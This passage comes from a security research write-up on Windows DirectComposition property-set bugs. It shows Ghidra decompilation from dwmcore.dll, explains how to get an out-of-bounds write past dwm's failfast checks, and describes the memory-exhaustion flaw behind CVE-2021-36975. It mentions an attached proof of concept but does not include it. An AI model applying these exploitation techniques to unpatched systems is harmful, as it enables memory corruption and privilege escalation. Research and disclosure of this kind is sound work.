      *(uint *)(*(longlong *)(this + 0x48) + 4 + uVar1 * 8) = iPropertyId & 0x1fffffff | 0x40000000;
      return 0;
    }
  }
```
```
dwmcore.dll:
CPropertySet::UpdateProperty<struct_D2DVector2>
          (CPropertySet *this,uint uPropertyId,DCOMPOSITION_EXPRESSION_TYPE pExprType,
          D2DVector2 *pVectorValue)

{
  int iResult;
  undefined4 in_register_00000014;
  
  //if (this->properties[uPropertyId]->type == type
  if (*(DCOMPOSITION_EXPRESSION_TYPE *)(*(longlong *)(this + 0x50) + (ulonglong)uPropertyId * 8) ==
      pExprType) {
      //(QWORD *)(this->propertiesData + (this->properties[uPropertyId]->offset & 0x1fffffff)) = *pVectorValue
    *(undefined8 *)
     ((ulonglong)
      (*(uint *)(*(longlong *)(this + 0x50) + 4 + (ulonglong)uPropertyId * 8) & 0x1fffffff) +
     *(longlong *)(this + 0x70)) = *(undefined8 *)pVectorValue;
    iResult = PropertyUpdated<D2DMatrix>(this,CONCAT44(in_register_00000014,uPropertyId),1);
    if (-1 < iResult) {
      return 0;
    }
  }
  else {
    iResult = -0x7ff8ffa9;
  }
  MilInstrumentationCheckHR_MaybeFailFast();
  return (long)iResult;
}
```

However if we look closely, we face a further limitation. If we pass a message to dwmcore via alpc to update a property, dwmcore!CCompositon::ProcessMessage calls CPropertySet::ProcessSetPropertyValue. It reads the property info buffer to check some metadata at a corresponding index into the buffer (ie resource offset into propertyset buffer and its expression type). If we dont meet these criteria in ProcessSetPropertyValue, then dwm will failfast (trigger WER, exit and restart).
```
(Ghidra output):

      //if pcmdBuffer.bUpdate==true
      if (pcmdBuffer[0x14] == (tagMILCMD_PROPERTYSET_SETPROPERTYVALUE)0x0) {
	//if pPropInfoBuffer[i]->propertyoffset == iPropertyId * 8
        if (*(uint *)(pcmdBuffer + 0xc) ==
            (*(uint *)(*(longlong *)(param_1 + 0x50) + 4 + (ulonglong)*(uint *)(pcmdBuffer + 8) * 8)
            & 0x1fffffff)) {
          //call UpdateProperty<struct_D2DVector2>
          uVar2 = UpdateProperty<struct_D2DVector2>(param_1,*(uint *)(pcmdBuffer + 8),0x23,param_4);
          goto joined_r0x000180121bdd;
        }
	//****We DON'T want to reach here****
        uVar2 = 0x88980403;
      }
      else {
        uVar2 = AddProperty<D2DVector2>
                          (param_1,*(undefined4 *)(pcmdBuffer + 8),*(undefined4 *)(pcmdBuffer + 0xc)
                           ,0x23,param_4);
joined_r0x000180121bdd:
        if (-1 < (int)uVar2) {
          return 0;
        }
      }
      //****Because then we'll reach handle table check here, trigger RaiseFailFastException which invokes WER****
      MilInstrumentationCheckHR_MaybeFailFast();
      goto LAB_180121c3c;
    }
//instead, we want to return 0 and write out of bounds
joined_r0x000180121bdd:
        if (-1 < (int)uVar2) {
          return 0;
        }
      }
      MilInstrumentationCheckHR_MaybeFailFast();
      goto LAB_180121c3c;
    }
```

So even if we try to update out of bounds, the property we read from should have the same offset in the propertyinfo store
as the weird property in kernel-mode does. And if we only have one property, this still won't be sufficient because the property type in dwm.exe will be zero'd out, so this will also trigger failfast/wer as we can see here:
```
                    /* if (this->properties[uPropertyId]->type == type */
  if (*(DCOMPOSITION_EXPRESSION_TYPE *)(*(longlong *)(this + 0x50) + (ulonglong)uPropertyId * 8) ==
      pExprType) {
		/* snip */
  }
  else {
    iResult = -0x7ff8ffa9;
  }
  MilInstrumentationCheckHR_MaybeFailFast();
  return (long)iResult;
}
```

All this means is that if we make a bunch of properties and try to write out of bounds with some of them, dwm will crash if some of their propertyinfo buffers don't occupy freed chunks containing "fake" properties. Further we don't have the same wide selection of objects to use for heap feng shui in dwmcore like CTableTransferEffectMarshaler and CExpressionMarshaler. If dwm crashes it will simply start again, but it's still noisy, so I never spent too much time looking at it. The attached poc just shows how to overwrite a vtable pointer, instead of the propertyset buffer. But either way is still possible in user-mode.

# CVE 2021 36975

Before this patch, AddProperty<type> still incremented the properties count if Win32AllocPool failed, but the object was never created. So you could still write out of bounds this way.

Win32 objects can basically be divided into two categories: objects that are allocated in the nonpaged pool with HMAllocObject (wnds, menus, wnd hooks, ddi conversations, cursors, accel tables) and ones that are allocated in the paged "session pool" with Win32AllocPool (DirectComposition objects, GDI objects, some little blobs of window data like menu/window class names). Kernel code usually on some level assumes allocation infallibility. In other words, the kernel allocates by 0x1000 byte pages, what happens if there isn't enough available memory to return a new page? You don't want to trap the exception and bugcheck, that would be bad. So you simply handle the exception and continue execution. Obviously this can introduce some undefined behavior but it's necessary at such a low level. If you look at how user-mode dwm.exe dynamic array behaves under memory exhaustion it's a little different; maybe they didn't take this into account. But anyway, AddProperty<T> didn't properly consider this case of memory exhaustion. You can spam allocations until paged session pool memory is exhausted. Now if you have a CPropertySetMarshaler with no properties, and you go to create one, and the propertyinfo allocation succeeds but propertyset buffer allocation fails, then the next time UpdateProperty or EmitSetProperties is called it will dereference a null pointer or whatever happens to be at *this+0x58. They fixed this by adding a RemoveAt function that updates the propertyinfo buffer when Win32AllocPool fails.
